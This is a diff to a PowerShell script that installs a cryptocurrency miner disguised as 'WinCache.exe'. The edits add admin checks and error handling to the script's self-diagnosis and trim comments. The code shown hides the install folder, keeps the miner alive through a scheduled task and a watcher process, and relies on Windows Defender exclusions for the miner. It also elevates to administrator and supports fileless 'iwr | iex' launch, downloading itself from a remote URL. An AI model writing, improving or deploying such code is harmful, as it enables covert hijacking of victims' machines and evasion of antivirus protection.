@@ -83,67 +83,92 @@ if ($TestWebhook) {
     return
 }
 
-# ---------- diagnose --------------------------------------------------------
+# ---------- diagnose (BLINDADO CONTRA FALTA DE PERMISOS) --------------------
 if ($Diagnose) {
     function Section($t) { Write-Host ''; Write-Host "=== $t ===" -ForegroundColor Cyan }
     function Line($k, $v) { Write-Host ("  {0,-28} {1}" -f $k, $v) }
 
+    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if (-not $isAdmin) {
+        Write-Host "[!] Ejecutando sin privilegios de Administrador. Algunas lecturas pueden fallar." -ForegroundColor Yellow
+    }
+
     Section 'Install path'
     Line 'Root'        $Root
-    Line 'Exists'      (Test-Path $Root)
-    Line 'Hidden'      (if (Test-Path $Root) { ((Get-Item $Root -Force).Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0 } else { 'n/a' })
-    Line 'WinCache.exe'(Test-Path $ExePath)
-    Line 'WinCache.ps1'(Test-Path $SelfPs)
-    Line 'miner.log'   $LogFile
+    
+    try {
+        Line 'Exists'      (Test-Path $Root -ErrorAction Stop)
+        Line 'Hidden'      (if (Test-Path $Root) { ((Get-Item $Root -Force).Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0 } else { 'n/a' })
+        Line 'WinCache.exe'(Test-Path $ExePath -ErrorAction Stop)
+        Line 'WinCache.ps1'(Test-Path $SelfPs -ErrorAction Stop)
+        Line 'miner.log'   $LogFile
+    } catch {
+        Write-Host "  [!] Error al leer los archivos: Acceso Denegado." -ForegroundColor Red
+    }
 
     Section 'Scheduled Task'
-    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
-    if ($task) {
-        Line 'Task Name' $task.TaskName
-        Line 'State'     $task.State
-        $taskArgs = $task.Actions.Arguments
-        if ($taskArgs.Length -gt 100) {
-            Line 'Arguments' ($taskArgs.Substring(0, 100) + '... [truncado]')
+    try {
+        $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop
+        if ($task) {
+            Line 'Task Name' $task.TaskName
+            Line 'State'     $task.State
+            $taskArgs = $task.Actions.Arguments
+            if ($taskArgs.Length -gt 100) {
+                Line 'Arguments' ($taskArgs.Substring(0, 100) + '... [truncado]')
+            } else {
+                Line 'Arguments' $taskArgs
+            }
         } else {
-            Line 'Arguments' $taskArgs
+            Write-Host '  No hay tarea programada activa.' -ForegroundColor Yellow
         }
-    } else {
-        Write-Host '  No hay tarea programada activa.' -ForegroundColor Yellow
+    } catch {
+        Write-Host "  [!] Error al leer la tarea programada (o no existe)." -ForegroundColor Yellow
     }
 
     Section 'Defender exclusions'
     try {
-        $mp = Get-MpPreference
+        $mp = Get-MpPreference -ErrorAction Stop
         $paths  = @($mp.ExclusionPath)
         $procs  = @($mp.ExclusionProcess)
         Line 'ExclusionPath match'    ($paths -contains $Root)
         Line 'ExclusionProcess match' ($procs -contains 'WinCache.exe')
     } catch {
-        Write-Host "  No se pudo consultar Defender: $_" -ForegroundColor Yellow
+        Write-Host "  [!] No se pudo consultar Defender: Acceso Denegado." -ForegroundColor Yellow
     }
 
     Section 'Processes'
-    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
-        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
-    if ($watchers) {
-        foreach ($w in $watchers) {
-            Line "Watcher PID $($w.ProcessId)" "PowerShell corriendo con -Run"
+    try {
+        $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction Stop |
+            Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
+        if ($watchers) {
+            foreach ($w in $watchers) {
+                Line "Watcher PID $($w.ProcessId)" "PowerShell corriendo con -Run"
+            }
+        } else {
+            Write-Host '  Ningún watcher corriendo.' -ForegroundColor Yellow
         }
-    } else {
-        Write-Host '  Ningún watcher corriendo.' -ForegroundColor Yellow
-    }
-    $miners = Get-Process WinCache -ErrorAction SilentlyContinue
-    if ($miners) {
-        foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" }
-    } else {
-        Write-Host '  Miner NO está corriendo.' -ForegroundColor Yellow
+    } catch {
+        Write-Host "  [!] No se pudo leer la lista de procesos." -ForegroundColor Yellow
     }
 
+    try {
+        $miners = Get-Process WinCache -ErrorAction SilentlyContinue
+        if ($miners) {
+            foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" }
+        } else {
+            Write-Host '  Miner NO está corriendo.' -ForegroundColor Yellow
+        }
+    } catch {}
+
     Section 'Last 15 lines of miner.log'
-    if (Test-Path $LogFile) {
-        Get-Content $LogFile -Tail 15 | ForEach-Object { Write-Host "  $_" }
-    } else {
-        Write-Host '  (miner.log no existe)' -ForegroundColor Yellow
+    try {
+        if (Test-Path $LogFile -ErrorAction Stop) {
+            Get-Content $LogFile -Tail 15 -ErrorAction Stop | ForEach-Object { Write-Host "  $_" }
+        } else {
+            Write-Host '  (miner.log no existe)' -ForegroundColor Yellow
+        }
+    } catch {
+        Write-Host "  [!] No se pudo leer miner.log (requiere permisos de Administrador)." -ForegroundColor Red
     }
 
     Write-Host ''
@@ -151,7 +176,7 @@ if ($Diagnose) {
 }
 
 # ---------- elevation (MODIFICADO PARA IEX) ---------------------------------
-if (-not $Run -and -not $NoElevate) {
+if (-not $Run -and -not $NoElevate -and -not $Diagnose) {
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
     $pr = New-Object Security.Principal.WindowsPrincipal($id)
     if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -371,16 +396,13 @@ if ([string]::IsNullOrWhiteSpace($Worker)) {
 
 # ---------- install self (MODIFICADO PARA IEX) ------------------------------
 if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
-    # Si se ejecuta desde un archivo
     Copy-Item $scriptPath $SelfPs -Force
     Unblock-File $SelfPs -ErrorAction SilentlyContinue
 } elseif (-not $scriptPath -or -not (Test-Path $scriptPath)) {
-    # Si se ejecuta desde memoria (iwr | iex), descarga el script a la carpeta
     Write-Host '[*] Ejecución en memoria detectada. Guardando copia local...'
     Invoke-WebRequest -Uri $RemoteUrl -OutFile $SelfPs -UseBasicParsing
 }
 
-# Validación de seguridad
 $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
 if ($head -notmatch '^#Requires' -and $head -notmatch '^<#' -and $head -notmatch '^\[CmdletBinding') {
     Remove-Item $SelfPs -Force -ErrorAction SilentlyContinue
